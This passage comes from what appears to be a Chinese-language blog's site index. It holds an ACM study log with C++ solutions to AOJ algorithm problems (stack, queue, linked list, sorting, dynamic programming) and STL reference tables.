1400</span><br><br><span class="hljs-type">int</span> dp[MAX][MAX], G[MAX][MAX];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getS</span><span class="hljs-params">(<span class="hljs-type">int</span> H,<span class="hljs-type">int</span> W)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> maxWidth = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;H;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;W;j++)<br>        &#123;<br>            dp[i][j]=(G[i][j]+<span class="hljs-number">1</span>)%<span class="hljs-number">2</span>;<br>            maxWidth |= dp[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;H;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;W;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(G[i][j])<br>            &#123;<br>                dp[i][j]=<span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                dp[i][j]=<span class="hljs-built_in">min</span>(dp[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>], <span class="hljs-built_in">min</span>(dp[i<span class="hljs-number">-1</span>][j], dp[i][j<span class="hljs-number">-1</span>])) + <span class="hljs-number">1</span>;<br>                maxWidth=<span class="hljs-built_in">max</span>(maxWidth, dp[i][j]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> maxWidth * maxWidth;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> H,W;<br>    cin&gt;&gt;H&gt;&gt;W;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;H;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;W;j++)<br>            cin&gt;&gt;G[i][j];<br>        cout&lt;&lt;<span class="hljs-built_in">getS</span>(H,W)&lt;&lt;endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-学习记录-数据结构-1</title>
      <link href="/2020/11/ec23b92c.html"/>
      <url>/2020/11/ec23b92c.html</url>
      
        <content type="html"><![CDATA[<h1 id="AOJ-ALDS1-1-D-Maximum-Profit"><a href="#AOJ-ALDS1-1-D-Maximum-Profit" class="headerlink" title="AOJ-ALDS1_1_D Maximum Profit"></a>AOJ-ALDS1_1_D Maximum Profit</h1><p>本题主要考虑要将复杂度降到O(n)，否则过不了最后五组数据</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> n,maxv=<span class="hljs-number">-1e10</span>;<br><span class="hljs-type">int</span> stock[<span class="hljs-number">200000</span> + <span class="hljs-number">5</span>];<br>cin&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>cin&gt;&gt;stock[i];<br>&#125;<br><span class="hljs-type">int</span> minv=stock[<span class="hljs-number">0</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;n;j++)<br>&#123;<br>maxv=<span class="hljs-built_in">max</span>(maxv, stock[j]-minv);<br>minv=<span class="hljs-built_in">min</span>(minv, stock[j]);<br>&#125;<br>cout&lt;&lt;maxv&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><span id="more"></span><h1 id="STL标准库"><a href="#STL标准库" class="headerlink" title="STL标准库"></a>STL标准库</h1><h2 id="栈stack"><a href="#栈stack" class="headerlink" title="栈stack"></a>栈stack</h2><table><thead><tr><th>函数名</th><th>功能</th><th>复杂度</th></tr></thead><tbody><tr><td>size()</td><td>返回栈的元素数</td><td>O(1)</td></tr><tr><td>top()</td><td>返回栈顶元素</td><td>O(1)</td></tr><tr><td>pop()</td><td>从栈中取出并删除元素</td><td>O(1)</td></tr><tr><td>push()</td><td>添加元素x</td><td>O(1)</td></tr><tr><td>empty()</td><td>在栈为空时返回true</td><td>O(1)</td></tr></tbody></table><h3 id="ALDS1-3-A-Stack"><a href="#ALDS1-3-A-Stack" class="headerlink" title="ALDS1_3_A Stack"></a>ALDS1_3_A Stack</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stack&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>stack&lt;<span class="hljs-type">int</span>&gt; s;<br><span class="hljs-type">int</span> a,b,x;<br>string str;<br><span class="hljs-keyword">while</span>(cin&gt;&gt;str)<br>&#123;<br><span class="hljs-keyword">if</span>(str[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;+&#x27;</span>)<br>&#123;<br>a=s.<span class="hljs-built_in">top</span>(); s.<span class="hljs-built_in">pop</span>();<br>b=s.<span class="hljs-built_in">top</span>();s.<span class="hljs-built_in">pop</span>();<br>s.<span class="hljs-built_in">push</span>(a+b);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;-&#x27;</span>)<br>&#123;<br>b=s.<span class="hljs-built_in">top</span>();s.<span class="hljs-built_in">pop</span>();<br>a=s.<span class="hljs-built_in">top</span>();s.<span class="hljs-built_in">pop</span>();<br>s.<span class="hljs-built_in">push</span>(a-b);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;*&#x27;</span>)<br>&#123;<br>a=s.<span class="hljs-built_in">top</span>();s.<span class="hljs-built_in">pop</span>();<br>b=s.<span class="hljs-built_in">top</span>();s.<span class="hljs-built_in">pop</span>();<br>s.<span class="hljs-built_in">push</span>(a*b);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>s.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">atoi</span>(str.<span class="hljs-built_in">c_str</span>()));<br>&#125;<br>&#125;<br>cout&lt;&lt;s.<span class="hljs-built_in">top</span>()&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="队列queue"><a href="#队列queue" class="headerlink" title="队列queue"></a>队列queue</h2><table><thead><tr><th>函数名</th><th>功能</th><th>复杂度</th></tr></thead><tbody><tr><td>size()</td><td>返回队列元素数</td><td>O(1)</td></tr><tr><td>front()</td><td>返回队头元素</td><td></td></tr><tr><td>pop()</td><td>从队列中取出并删除元素</td><td></td></tr><tr><td>push()</td><td>向队列中添加元素</td><td></td></tr><tr><td>empty()</td><td>在队列为空时返回true</td><td></td></tr></tbody></table><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,q,t;<br>string name;<br>queue&lt;pair&lt;string, <span class="hljs-type">int</span>&gt; &gt; Q;<br>cin&gt;&gt;n&gt;&gt;q;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>cin&gt;&gt;name&gt;&gt;t;<br>Q.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">make_pair</span>(name, t));<br>&#125;<br><br>pair&lt;string ,<span class="hljs-type">int</span>&gt; u;<br><span class="hljs-type">int</span> elap=<span class="hljs-number">0</span>,a;<br><br><span class="hljs-keyword">while</span>(!Q.<span class="hljs-built_in">empty</span>())<br>&#123;<br>u=Q.<span class="hljs-built_in">front</span>();Q.<span class="hljs-built_in">pop</span>();<br>a=<span class="hljs-built_in">min</span>(u.second, q);<br>u.second-=a;<br>elap+=a;<br><span class="hljs-keyword">if</span>(u.second&gt;<span class="hljs-number">0</span>)<br>&#123;<br>Q.<span class="hljs-built_in">push</span>(u);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout&lt;&lt;u.first&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;elap&lt;&lt;endl;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>size()</td><td>返回向量的元素数</td></tr><tr><td>push_back()</td><td>在向量末尾添加元素x</td></tr><tr><td>pop_back()</td><td>删除向量的最后一个元素</td></tr><tr><td>begin()</td><td>返回指向向量开头的迭代器</td></tr><tr><td>end()</td><td>返回指向向量末尾的迭代器</td></tr><tr><td>insert(p,x)</td><td>在向量的位置p处插入元素x</td></tr><tr><td>erase(p)</td><td>删除向量中位置p的元素</td></tr><tr><td>clear()</td><td>删除向量中的所有元素</td></tr></tbody></table><h2 id="双向链表List"><a href="#双向链表List" class="headerlink" title="双向链表List"></a>双向链表List</h2><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>size()</td><td>返回表的元素数</td></tr><tr><td>begin()</td><td>返回指向表开头的迭代器</td></tr><tr><td>end()</td><td>返回指向表末尾的迭代器</td></tr><tr><td>push_front(x)</td><td>在表开头添加元素x</td></tr><tr><td>push_back(x)</td><td>在表末尾添加元素x</td></tr><tr><td>pop_front()</td><td>删除位于表开头的元素</td></tr><tr><td>pop_back()</td><td>删除位于表末尾的元素</td></tr><tr><td>insert(p, x)</td><td>在表的位置p处插入元素x</td></tr><tr><td>erase(p)</td><td>删除表中位置p的元素</td></tr><tr><td>clear()</td><td>删除表中所有元素</td></tr></tbody></table><h3 id="ALDS1-3-C-Doubly-Linked-List"><a href="#ALDS1-3-C-Doubly-Linked-List" class="headerlink" title="ALDS1_3_C: Doubly Linked List"></a>ALDS1_3_C: Doubly Linked List</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> q,x;<br>string command;<br>list&lt;<span class="hljs-type">int</span>&gt; v;<br>cin&gt;&gt;q;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;q;i++)<br>&#123;<br>cin&gt;&gt;command;<br><span class="hljs-keyword">if</span>(command[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;i&#x27;</span>)<br>&#123;<br>cin&gt;&gt;x;<br>v.<span class="hljs-built_in">push_front</span>(x);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(command[<span class="hljs-number">6</span>]==<span class="hljs-string">&#x27;L&#x27;</span>)<br>&#123;<br>v.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(command[<span class="hljs-number">6</span>]==<span class="hljs-string">&#x27;F&#x27;</span>)<br>&#123;<br>v.<span class="hljs-built_in">pop_front</span>();<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(command[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;d&#x27;</span>)<br>&#123;<br>cin&gt;&gt;x;<br><span class="hljs-keyword">for</span>(list&lt;<span class="hljs-type">int</span>&gt;::iterator it=v.<span class="hljs-built_in">begin</span>();it!=v.<span class="hljs-built_in">end</span>();it++)<br>&#123;<br><span class="hljs-keyword">if</span>(*it == x)<br>&#123;<br>v.<span class="hljs-built_in">erase</span>(it);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(list&lt;<span class="hljs-type">int</span>&gt;::iterator it=v.<span class="hljs-built_in">begin</span>(); it!=v.<span class="hljs-built_in">end</span>();it++)<br>&#123;<br><span class="hljs-keyword">if</span>(i++)cout&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>cout&lt;&lt;*it;<br>&#125;<br>cout&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ALDS1-3-D-Areas-on-the-Cross-Section-Diagram"><a href="#ALDS1-3-D-Areas-on-the-Cross-Section-Diagram" class="headerlink" title="ALDS1_3_D: Areas on the Cross-Section Diagram"></a>ALDS1_3_D: <a href="http://judge.u-aizu.ac.jp/onlinejudge/description.jsp?id=ALDS1_3_D">Areas on the Cross-Section Diagram</a></h2><ul><li>如果是“\”，则将表示该字符位置的整数i压入栈S1</li><li>如果是“&#x2F;”，则送S1顶部取出与之对应的”&quot;的位置i，算出二者的距离并累加到总面积内</li><li>“_”的作用只是将一对/距离增加1，然而在代码中已经通过数学方法计算了，因此可以忽略掉”__”符号</li><li>新形成的面积&#x3D;当前S2中的两个面积之和+新形成的i-j部分的面积，从S1中取出被引用的多个面积，再将新算出的面积压入S2。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>stack&lt;<span class="hljs-type">int</span>&gt; S1;<br>stack&lt;pair&lt;<span class="hljs-type">int</span> ,<span class="hljs-type">int</span>&gt; &gt; S2;<br><span class="hljs-type">char</span> c;<br><span class="hljs-type">int</span> sum=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;cin&gt;&gt;c;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(c==<span class="hljs-string">&#x27;\\&#x27;</span>)S1.<span class="hljs-built_in">push</span>(i);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(c==<span class="hljs-string">&#x27;/&#x27;</span> &amp;&amp; S1.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-type">int</span> j=S1.<span class="hljs-built_in">top</span>(); S1.<span class="hljs-built_in">pop</span>();<br>sum+=i-j;<br><span class="hljs-type">int</span> a=i-j;<br><span class="hljs-keyword">while</span>(S2.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">0</span> &amp;&amp; S2.<span class="hljs-built_in">top</span>().first&gt;j)<br>&#123;<br>a+=S2.<span class="hljs-built_in">top</span>().second;S2.<span class="hljs-built_in">pop</span>();<br>&#125;<br>S2.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">make_pair</span>(j, a));<br>&#125;<br>&#125;<br>vector&lt;<span class="hljs-type">int</span>&gt; ans;<br><span class="hljs-keyword">while</span>(S2.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">0</span>)<br>&#123;<br>ans.<span class="hljs-built_in">push_back</span>(S2.<span class="hljs-built_in">top</span>().second);<br>S2.<span class="hljs-built_in">pop</span>();<br>&#125;<br><span class="hljs-built_in">reverse</span>(ans.<span class="hljs-built_in">begin</span>(),ans.<span class="hljs-built_in">end</span>());<br>cout&lt;&lt;sum&lt;&lt;endl;<br>cout&lt;&lt;ans.<span class="hljs-built_in">size</span>();<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;ans.<span class="hljs-built_in">size</span>();i++)<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;ans[i];<br>&#125;<br>cout&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><h3 id="基本运算符"><a href="#基本运算符" class="headerlink" title="基本运算符"></a>基本运算符</h3><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>++</td><td>让迭代器指向至下一元素</td></tr><tr><td>&#x3D;&#x3D;，!&#x3D;</td><td>判断两个迭代器是否指向同一位置并返回结果</td></tr><tr><td>&#x3D;</td><td>将右侧的值代入左侧迭代器所引用的元素的位置</td></tr><tr><td>*</td><td>返回该位置的元素</td></tr></tbody></table><h2 id="lower-bound"><a href="#lower-bound" class="headerlink" title="lower_bound"></a>lower_bound</h2><p>返回一个指向第一个不小于指定值value的元素</p><h2 id="排序sort"><a href="#排序sort" class="headerlink" title="排序sort"></a>排序sort</h2><p>stable_sort较稳定</p><blockquote><p>****sort的应用****；</p><p>1、可以传入两个参数；</p><p>   sort(a,a+N) ,其中a是数组，a+N表示对a[0]至a[N-1]的N个数进行排序(默认从小到大排序)；</p><p>2、传入三个参数；</p><p>   sort(a,a+N,cmp),第三个参数是一个函数 ；</p><p>   如果让函数从大到小排序，可以用如下算法实现；</p><p>   bool cmp(int a,int b){return a&gt;b};</p><p>   sort(A,A+N,cmp);</p><p>而****stable_sort的用法*<em><strong>与sort一致，</strong>区别是stable_sort函数遇到两个数相等时，不对其交换顺序</em>*；这个应用在数组里面不受影响，当函数参数传入的是结构体时，会发现两者之间的明显区别；</p></blockquote><h2 id="ALDS1-6-D-Minimum-Cost-Sort"><a href="#ALDS1-6-D-Minimum-Cost-Sort" class="headerlink" title="ALDS1_6_D: Minimum Cost Sort"></a>ALDS1_6_D: Minimum Cost Sort</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn=<span class="hljs-number">1000</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> vmax=<span class="hljs-number">10000</span>;<br><br><span class="hljs-type">int</span> n,a[maxn],s;<br><span class="hljs-type">int</span> b[maxn],t[vmax+<span class="hljs-number">1</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br><span class="hljs-type">bool</span> v[maxn];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>b[i]=a[i];<br>v[i]=<span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-built_in">sort</span>(b,b+n);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>t[b[i]] = i;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(v[i])<span class="hljs-keyword">continue</span>;<br><span class="hljs-type">int</span> cur=i,m=vmax,an=<span class="hljs-number">0</span>,S=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>&#123;<br>v[cur]=<span class="hljs-literal">true</span>;<br>an++;<br><span class="hljs-type">int</span> V=a[cur];<br>m=<span class="hljs-built_in">min</span>(m,V);<br>S+=V;<br>cur=t[V];<br><span class="hljs-keyword">if</span>(v[cur])<span class="hljs-keyword">break</span>;<br>&#125;<br>ans+=<span class="hljs-built_in">min</span>(S+(an - <span class="hljs-number">2</span>) *m, m+S+(an+<span class="hljs-number">1</span>)*s);<span class="hljs-comment">//2SOLUTIONS</span><br>&#125;<br><span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin&gt;&gt;n;<br>s=vmax;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>cin&gt;&gt;a[i];<br>s=<span class="hljs-built_in">min</span>(s,a[i]);<br>&#125;<br><span class="hljs-type">int</span> ans=<span class="hljs-built_in">solve</span>();<br>cout&lt;&lt;ans&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="动态规划DP"><a href="#动态规划DP" class="headerlink" title="动态规划DP"></a>动态规划DP</h1><h2 id="LCS"><a href="#LCS" class="headerlink" title="LCS"></a>LCS</h2><figure class="highlight 